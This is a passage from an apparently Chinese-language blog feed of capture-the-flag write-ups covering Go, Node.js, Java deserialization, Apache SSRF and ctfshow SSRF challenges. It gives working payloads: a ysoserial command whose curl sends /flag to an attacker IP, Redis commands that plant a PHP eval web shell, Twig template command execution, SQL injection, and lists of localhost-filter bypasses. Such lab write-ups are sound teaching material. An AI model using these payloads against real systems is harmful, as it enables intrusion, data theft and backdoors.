class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;render(c)&#125;)r.GET(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;session := sessions.Default(c)session.Set(<span class="hljs-string">&quot;FLAG&quot;</span>, os.Getenv(<span class="hljs-string">&quot;FLAG&quot;</span>))session.Save()c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;flag is in your session&quot;</span>)&#125;)r.POST(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;session := sessions.Default(c)<span class="hljs-keyword">var</span> his <span class="hljs-keyword">string</span><span class="hljs-keyword">if</span> session.Get(<span class="hljs-string">&quot;history&quot;</span>) == <span class="hljs-literal">nil</span> &#123;his = <span class="hljs-string">&quot;&quot;</span>&#125; <span class="hljs-keyword">else</span> &#123;his = session.Get(<span class="hljs-string">&quot;history&quot;</span>).(<span class="hljs-keyword">string</span>)&#125;eval := Eval&#123;&#125;<span class="hljs-keyword">if</span> err := c.ShouldBind(&amp;eval); err == <span class="hljs-literal">nil</span> &#123;his = his + eval.String() + <span class="hljs-string">&quot;&quot;</span>&#125;session.Set(<span class="hljs-string">&quot;history&quot;</span>, his)session.Save()render(c)&#125;)r.Run(fmt.Sprintf(<span class="hljs-string">&quot;:%s&quot;</span>, port))&#125;</code></pre><p>本地开启输出flag</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (_ <span class="hljs-string">&quot;embed&quot;</span><span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-string">&quot;os&quot;</span><span class="hljs-string">&quot;github.com/gin-contrib/sessions&quot;</span><span class="hljs-string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;port := os.Getenv(<span class="hljs-string">&quot;PORT&quot;</span>)<span class="hljs-keyword">if</span> port == <span class="hljs-string">&quot;&quot;</span> &#123;port = <span class="hljs-string">&quot;8080&quot;</span>&#125;r := gin.Default()store := cookie.NewStore([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;woW_you-g0t_sourcE_co6e&quot;</span>))r.Use(sessions.Sessions(<span class="hljs-string">&quot;session&quot;</span>, store))r.GET(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;session := sessions.Default(c)<span class="hljs-built_in">println</span>(session.Get(<span class="hljs-string">&quot;FLAG&quot;</span>).(<span class="hljs-keyword">string</span>))&#125;)r.Run(fmt.Sprintf(<span class="hljs-string">&quot;:%s&quot;</span>, port))&#125;</code></pre><h2 id="newcalc0"><a href="#newcalc0" class="headerlink" title="newcalc0"></a>newcalc0</h2><p>nodejs原型链污染<br><a href="https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824">CVE-2022-21824</a></p><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;path&quot;</span>);<span class="hljs-keyword">const</span> vm2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);<span class="hljs-keyword">const</span> app = express();app.use(express.urlencoded(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));app.use(express.json());app.use(express.static(<span class="hljs-string">&quot;static&quot;</span>));<span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> vm2.NodeVM();app.use(<span class="hljs-string">&quot;/eval&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;  <span class="hljs-keyword">const</span> e = req.body.e;  <span class="hljs-keyword">if</span> (!e) &#123;    res.send(<span class="hljs-string">&quot;wrong?&quot;</span>);    <span class="hljs-keyword">return</span>;  &#125;  <span class="hljs-keyword">try</span> &#123;    res.send(vm.run(<span class="hljs-string">&quot;module.exports=&quot;</span>+e)?.toString() ?? <span class="hljs-string">&quot;no&quot;</span>);  &#125; <span class="hljs-keyword">catch</span> (e) &#123;    <span class="hljs-built_in">console</span>.log(e)    res.send(<span class="hljs-string">&quot;wrong?&quot;</span>);  &#125;&#125;);app.use(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;  <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span>.keys(<span class="hljs-built_in">Object</span>.prototype).length &gt; <span class="hljs-number">0</span></span>)</span> &#123;    <span class="hljs-built_in">Object</span>.keys(<span class="hljs-built_in">Object</span>.prototype).forEach(<span class="hljs-function"><span class="hljs-params">k</span> =&gt;</span> <span class="hljs-keyword">delete</span> <span class="hljs-built_in">Object</span>.prototype[k]);    res.send(process.env.FLAG);  &#125; <span class="hljs-keyword">else</span> &#123;    res.send(<span class="hljs-built_in">Object</span>.keys(<span class="hljs-built_in">Object</span>.prototype));  &#125;&#125;)app.use(<span class="hljs-string">&quot;/source&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;  <span class="hljs-keyword">let</span> p = req.query.path || <span class="hljs-string">&quot;/src/index.js&quot;</span>;  p = path.join(path.resolve(<span class="hljs-string">&quot;.&quot;</span>), path.resolve(p));  <span class="hljs-built_in">console</span>.log(p);  res.sendFile(p);&#125;);app.use(<span class="hljs-function">(<span class="hljs-params">err, req, res, next</span>) =&gt;</span> &#123;  <span class="hljs-built_in">console</span>.log(err)  res.redirect(<span class="hljs-string">&quot;index.html&quot;</span>);&#125;);app.listen(process.env.PORT || <span class="hljs-number">8888</span>);</code></pre><p>payload:<code>console.table([&#123;x:1&#125;], [&quot;__proto__&quot;]);</code></p><p><a href="https://chowdera.com/2022/02/202202161841265824.html">MORE</a></p><h2 id="easyJava"><a href="#easyJava" class="headerlink" title="easyJava"></a>easyJava</h2><p>User类的<code>height</code>属性被<code>transient</code>修饰<br><a href="https://www.baeldung.com/java-transient-keyword">https://www.baeldung.com/java-transient-keyword</a><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202181825968.png"><br>也就是transient修饰的变量无法直接反序列化<br>需要在User类中重写<code>writeObject</code>方法</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> java.io.IOException</span>&#123; s.defaultWriteObject(); <span class="hljs-comment">//强制序列化name</span> s.writeObject(<span class="hljs-keyword">this</span>.height);&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;InterestingPHP&quot;&gt;&lt;a href=&quot;#InterestingPHP&quot; class=&quot;headerlink&quot; title=&quot;InterestingPHP&quot;&gt;&lt;/a&gt;InterestingPHP&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;hljs ph</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    <category term="VNCTF2022" scheme="http://lll-nnn.github.io/categories/CTF/wp/VNCTF2022/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="VNCTF2022" scheme="http://lll-nnn.github.io/tags/VNCTF2022/"/>
    
  </entry>
  
  <entry>
    <title>Hgame2022</title>
    <link href="http://lll-nnn.github.io/2022/02/06/hgame2022/"/>
    <id>http://lll-nnn.github.io/2022/02/06/hgame2022/</id>
    <published>2022-02-06T07:25:02.000Z</published>
    <updated>2022-02-19T15:24:07.772Z</updated>
    
    <content type="html"><![CDATA[<h2 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h2><blockquote><p>Webpack 是一个开源的前端打包工具。Webpack 提供了前端开发缺乏的模块化开发方式，将各种静态资源视为模块，并从它生成优化过的代码。</p></blockquote><p><code>Webpack 在打包 js 文件的时候开启了 sourcemap，可以借助 chrome开发者工具还原出源码</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202061601807.png"></p><p>base64解码两次</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache!"></a>Apache!</h2><p><code>cve-2021-40438</code>—apache SSRF</p><p><a href="https://www.wangan.com/p/7fygfy122c313bee">CVE-2021-40438-Apache httpd mod_proxy SSRF漏洞深入分析与复现</a></p><p>给了apache配置文件<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202061604540.png"></p><p>payload:<br><code>/proxy?unix:a&#123;5000&#125;|http://internal.host/flag</code></p><h2 id="一本单词书"><a href="#一本单词书" class="headerlink" title="一本单词书"></a>一本单词书</h2><p>登录：<code>adm1n 1080a</code></p><p>主要是encode和decode两个函数</p><p>传输数据格式为：<code>&#123;&quot;2&quot;:&quot;2&quot;&#125;</code></p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params">$data</span>): <span class="hljs-title">string</span> </span>&#123;    $result = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">foreach</span> ($data <span class="hljs-keyword">as</span> $k =&gt; $v) &#123;        $result .= $k . <span class="hljs-string">&#x27;|&#x27;</span> . serialize($v);    &#125;    <span class="hljs-keyword">return</span> $result;&#125;</code></pre><p><code>&#123;&quot;a&quot;:&quot;1&quot;,&quot;b&quot;:&quot;1&quot;&#125;</code>—–&gt;encode后<code>a|s:1:&quot;1&quot;;b|s:1:&quot;1&quot;;</code>—–&gt;decode后</p><pre><code>array(2) &#123;[&quot;a&quot;]=&gt;string(1) &quot;1&quot;[&quot;b&quot;]=&gt;string(1) &quot;1&quot;&#125;</code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202061736398.png"></p><h2 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h2><p><code>main.go</code></p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (<span class="hljs-string">&quot;log&quot;</span><span class="hljs-string">&quot;net/http&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fileHandler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;http.FileServer(http.Dir(<span class="hljs-string">&quot;./&quot;</span>)).ServeHTTP(w, r)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, fileHandler)http.HandleFunc(<span class="hljs-string">&quot;/there_may_be_a_flag&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;w.Write([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">`No! You can&#x27;t see the flag!`</span>))&#125;)log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;:8889&quot;</span>, <span class="hljs-literal">nil</span>))&#125;</code></pre><p>利用点：</p><ol><li>CONNECT方法不执行路径规范化</li><li>官方的http库在注册路由的时候没有指定请求类型，会将所有方法都注册</li></ol><p>payload：<code>curl -X CONNECT --path-as-is http://filesystem.hgame.homeboyc.cn//there_may_be_a_flag</code></p><p><code>-X</code>:请求方法<br><code>--path-as-is</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202192320228.png"></p><h2 id="SecurityCenter"><a href="#SecurityCenter" class="headerlink" title="SecurityCenter"></a>SecurityCenter</h2><p>考点：<code>twig模板注入</code><br>payload:<code>&#123;&#123;["tac /flag | base64"]|map("system")&#125;&#125;</code><br><a href="https://xz.aliyun.com/t/10056">Twig 模板注入从零到一</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;webpack-engine&quot;&gt;&lt;a href=&quot;#webpack-engine&quot; class=&quot;headerlink&quot; title=&quot;webpack-engine&quot;&gt;&lt;/a&gt;webpack-engine&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Webpack 是</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    <category term="hgame2022" scheme="http://lll-nnn.github.io/categories/CTF/wp/hgame2022/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="hgame2022" scheme="http://lll-nnn.github.io/tags/hgame2022/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化</title>
    <link href="http://lll-nnn.github.io/2022/01/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://lll-nnn.github.io/2022/01/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-01-19T11:15:51.000Z</published>
    <updated>2022-01-19T14:12:36.801Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>一个类要想能够被序列化和反序列化，必须实现<code>Serializable</code>接口</p><p><code>java.io.ObjectOutputStream</code>代表对象输出流，它的<code>writeObject(Object obj)</code>方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p><p><code>java.io.ObjectInputStream</code>代表对象输入流，它的<code>readObject()</code>方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</p><p>示例：<br><code>User.java</code></p><pre><code class="hljs java"><span class="hljs-keyword">package</span> serialize;<span class="hljs-keyword">import</span> java.io.Serializable;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 序列化ID</span><span class="hljs-comment"> */</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = -<span class="hljs-number">1184442687843856690L</span>;<span class="hljs-keyword">private</span> String name;<span class="hljs-keyword">private</span> String address;<span class="hljs-keyword">private</span> String telphone;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<span class="hljs-keyword">this</span>.name=name;&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAddress</span><span class="hljs-params">(String address)</span> </span>&#123;<span class="hljs-keyword">this</span>.address=address;&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTel</span><span class="hljs-params">(String telphone)</span> </span>&#123;<span class="hljs-keyword">this</span>.telphone=telphone;&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.name;&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getAddress</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.address;&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getTel</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.telphone;&#125;&#125;</code></pre><p><code>TestSerialize.java</code></p><pre><code class="hljs java"><span class="hljs-keyword">package</span> serialize;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.text.MessageFormat;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestSerialize</span> </span>&#123;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] ar)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;SerializeTest();User user=Deserialize();System.out.println(MessageFormat.format(<span class="hljs-string">&quot;name=&#123;0&#125;,address=&#123;1&#125;,telphone=&#123;2&#125;&quot;</span>, user.getName(),user.getAddress(),user.getTel()));&#125;<span class="hljs-comment">//序列化</span><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SerializeTest</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;User user=<span class="hljs-keyword">new</span> User();user.setName(<span class="hljs-string">&quot;1_/\\/&quot;</span>);user.setTel(<span class="hljs-string">&quot;12138&quot;</span>);user.setAddress(<span class="hljs-string">&quot;芜湖市&quot;</span>);FileOutputStream fo=<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;test.txt&quot;</span>);ObjectOutputStream oo=<span class="hljs-keyword">new</span> ObjectOutputStream(fo);oo.writeObject(user);System.out.println(<span class="hljs-string">&quot;Serialize success!&quot;</span>);oo.close();fo.close();&#125;<span class="hljs-comment">//反序列化</span><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> User <span class="hljs-title">Deserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;FileInputStream fi=<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;test.txt&quot;</span>);ObjectInputStream ois=<span class="hljs-keyword">new</span> ObjectInputStream(fi);User user=(User)ois.readObject();System.out.println(<span class="hljs-string">&quot;Deserialize seccess!&quot;</span>);ois.close();fi.close();<span class="hljs-keyword">return</span> user;&#125;&#125;</code></pre><p>运行<code>TestSerialize.java</code>，输出：</p><pre><code>Serialize success!Deserialize seccess!name=1_/\/,address=芜湖市,telphone=12138</code></pre><p>得到的文件<code>test.txt</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201191927648.png"></p><p>对文件内容进行base64加密<br><code>rO0ABXNyAA5zZXJpYWxpemUuVXNlcu+QA6aeQg7OAgADTAAHYWRkcmVzc3QAEkxqYXZhL2xhbmcvU3RyaW5nO0wABG5hbWVxAH4AAUwACHRlbHBob25lcQB+AAF4cHQACeiKnOa5luW4gnQABTFfL1wvdAAFMTIxMzg=</code></p><p>rO0AB—序列化后base64都以此开头</p><h2 id="一个简单的反序列化漏洞"><a href="#一个简单的反序列化漏洞" class="headerlink" title="一个简单的反序列化漏洞"></a>一个简单的反序列化漏洞</h2><p>Java反序列化会调用<code>readObject()</code>方法，当这个方法使用不当时，可能引起漏洞利用</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> serialize2;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] ar)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;UnsafeClass Unsafe = <span class="hljs-keyword">new</span> UnsafeClass();        Unsafe.name = <span class="hljs-string">&quot;hack&quot;</span>;        FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;test.txt&quot;</span>);        ObjectOutputStream os = <span class="hljs-keyword">new</span> ObjectOutputStream(fos);        <span class="hljs-comment">//writeObject()方法将Unsafe对象写入object文件</span>        os.writeObject(Unsafe);        os.close();        <span class="hljs-comment">//从文件中反序列化obj对象</span>        FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;test.txt&quot;</span>);        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(fis);        <span class="hljs-comment">//恢复对象</span>        UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject();        System.out.println(objectFromDisk.name);        ois.close();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UnsafeClass</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;    <span class="hljs-keyword">public</span> String name;    <span class="hljs-comment">//重写readObject()方法</span>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException</span>&#123;        <span class="hljs-comment">//执行默认的readObject()方法</span>        in.defaultReadObject();        <span class="hljs-comment">//执行命令</span>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);    &#125;&#125;</code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192008461.png"></p><p><a href="https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html">Java反序列化漏洞从入门到深入</a></p><h2 id="2020-网鼎杯-朱雀组-web-think-java"><a href="#2020-网鼎杯-朱雀组-web-think-java" class="headerlink" title="2020-网鼎杯-朱雀组-web-think_java"></a>2020-网鼎杯-朱雀组-web-think_java</h2><p>给了几个class文件<br><code>Java Decompiler</code>反编译一下</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192135692.png"></p><p>看到<code>import io.swagger.annotations.ApiOperation;</code>应该想到<code>swagger-ui.html</code></p><blockquote><p>Swagger UI:提供了一个可视化的UI页面展示描述文件。接口的调用方、测试、项目经理等都可以在该页面中对相关接口进行查阅和做一些简单的接口请求。该项目支持在线导入描述文件和本地部署UI项目。</p></blockquote><p><code>/common/test/sqlDict</code><br><code>SqlDict.class</code>存在sql注入<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192140037.png"></p><p>java的sql注入</p><p>payload：<code>myapp#&#39; union select pwd from user#;</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192143874.png"></p><p>得到账号为<code>admin</code>,密码为<code>admin@Rrrr_ctf_asde</code></p><p><code>/common/user/login</code>这个接口登录</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192146720.png"></p><p>可以看到data中的信息很明显时反序列化后base64，(如果开头是aced则为序列化后的hex编码)</p><p>用burp的一个插件<code>Java Deserialization Scanner</code>来探测，可以在<code>Bappstore</code> 下载<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192149384.png"></p><p>可以看到存在<code>ROME</code>型的反序列化</p><p>使用<a href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a>生成payload</p><p><code>java -jar ysoserial-master-8eb5cbfbf6-1.jar ROME &quot;curl http://xx.xx.xx.xx:9000 -d @/flag&quot; &gt; 123.bin</code></p><p>对<code>123.bin</code>中的内容base64编码</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;123.bin&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)pay=f.read()txt1=base64.b64encode(pay)print(<span class="hljs-string">&quot;Bearer &quot;</span>+txt1.decode(<span class="hljs-string">&quot;utf-8&quot;</span>))f.close()</code></pre><p><code>/common/user/current</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192154930.png"><br>监听端口即可得到flag<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201192211664.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;&lt;p&gt;一个类要想能够被序列化和反序列化，必须实现&lt;code&gt;Serializable&lt;/code&gt;接口&lt;/p&gt;
&lt;p&gt;&lt;code&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="Java" scheme="http://lll-nnn.github.io/categories/CTF/Java/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="java" scheme="http://lll-nnn.github.io/tags/java/"/>
    
    <category term="反序列化" scheme="http://lll-nnn.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Ctfshow-Ssrf</title>
    <link href="http://lll-nnn.github.io/2022/01/12/ctfshow-ssrf/"/>
    <id>http://lll-nnn.github.io/2022/01/12/ctfshow-ssrf/</id>
    <published>2022-01-12T12:22:09.000Z</published>
    <updated>2022-01-12T13:34:49.833Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web351-web358"><a href="#web351-web358" class="headerlink" title="web351-web358"></a>web351-web358</h2><p>各种绕<code>127.0.0.1</code></p><ul><li><p><a href="http://sudo.cc/">http://sudo.cc</a></p></li><li><p>127.1</p></li><li><p><a href="http://0.0.0.0/">http://0/</a></p></li><li><p><a href="http://0.0.0.0/">http://0.0.0.0</a></p></li><li><p>localhost</p></li><li><p>十六进制：0x7f.0.0.1        7F000001</p></li><li><p>八进制：177.0.0.1            </p></li><li><p>十进制：2130706433</p></li><li><p>二进制：1111111000000000000000000000001</p></li><li><p>http://[::]:80/  &gt;&gt;&gt;  <a href="http://127.0.0.1/">http://127.0.0.1</a></p></li><li><p>http://①②⑦.⓪.⓪.①</p></li><li><p>短网址</p></li><li><p><a href="http://127.0.0.1/">http://127。0。0。1</a>  &gt;&gt;&gt;  <a href="http://127.0.0.1/">http://127.0.0.1</a></p></li><li><pre><code class="php">http://vps/ssrf.phpssrf.php里面的内容为：&lt;?php header(&#39;Location:127.0.0.1&#39;);?&gt;<pre><code class="hljs php">```php<span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);highlight_file(<span class="hljs-keyword">__FILE__</span>);$url=$_POST[<span class="hljs-string">&#x27;url&#x27;</span>];$x=parse_url($url);<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,$url))&#123;    <span class="hljs-keyword">echo</span> file_get_contents($url);&#125;payload:url=http:<span class="hljs-comment">//ctf.@127.0.0.1/flag.php?show</span></code></pre>## web359hint:打无密码的mysql`./check.php`传参`seturl`![](https://gitee.com/ll_nn/pic/raw/master/img/202201122042838.png)</code></pre></li></ul><h2 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h2><p>hint：<code>打redis</code><br>用<code>gopherus</code>打</p><p>手打写shell</p><p>payload：</p><pre><code>dict://127.0.0.1:6379/config:set:dir:/var/www/htmldict://127.0.0.1:6379/config:set:shell:&quot;\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x31\x5d\x29\x3b\x3f\x3e&quot;dict://127.0.0.1:6379/config:set:dbfilename:1.phpdict://127.0.0.1:6379/save</code></pre><p><code>\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x31\x5d\x29\x3b\x3f\x3e</code>—-&gt;<code>&lt;?php eval($_POST[1]);?&gt;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web351-web358&quot;&gt;&lt;a href=&quot;#web351-web358&quot; class=&quot;headerlink&quot; title=&quot;web351-web358&quot;&gt;&lt;/a&gt;web351-web358&lt;/h2&gt;&lt;p&gt;各种绕&lt;code&gt;127.0.0.1&lt;/code&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    <category term="ctfshow" scheme="http://lll-nnn.github.io/categories/CTF/wp/ctfshow/"/>
    
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="ctfshow" scheme="http://lll-nnn.github.io/tags/ctfshow/"/>
    
    <category term="ssrf" scheme="http://lll-nnn.github.io/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>PHP-CVE</title>
    <link href="http://lll-nnn.github.io/2022/01/10/PHP-CVE/"/>
    <id>http://lll-nnn.github.io/2022/01/10/PHP-CVE/</id>
    <published>2022-01-10T08:43:06.000Z</published>
    <updated>2022-01-10T11:17:38.664Z</updated>
    
